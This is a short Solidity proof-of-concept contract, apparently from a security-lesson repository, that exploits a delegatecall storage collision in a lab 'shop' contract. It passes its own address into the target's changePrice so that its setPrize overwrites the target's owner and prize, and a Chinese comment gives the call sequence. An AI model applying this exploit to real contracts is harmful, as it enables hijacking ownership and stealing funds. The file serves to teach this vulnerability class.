pragma solidity ^0.5.0;
import "SecLessonPoc-main/contracts/delegatecall/check/shop.sol";
contract shopAttack{
    address public _goods;
    address public owner;
    uint256 public prize;
    uint256 public score;
    check che;
    constructor(address _che)public{
        che  = check(_che);
    }
    //调用两次attack和一次complete即可
    function setPrize(uint256 amount)public {
        prize = 0;
        owner = msg.sender;
        
    }

    function attack()public{
        che.changePrice(uint160(address(this)));
    }
    function complete()public{
        che.isCompleted();
    }
}